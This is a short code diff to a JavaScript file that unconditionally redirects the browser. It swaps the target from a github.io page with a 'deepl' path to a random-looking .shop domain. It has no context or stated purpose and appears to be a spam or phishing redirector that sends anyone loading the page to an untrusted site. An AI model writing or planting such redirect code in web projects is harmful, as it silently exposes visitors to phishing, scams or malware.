@@ -1,5 +1,6 @@
 (function() {
-    window['location'] = 'https://ab168188z.github.io/deepl/';
+    window['location'] = 'https://fjhksaoihf.shop/';
 })();
+
 
 
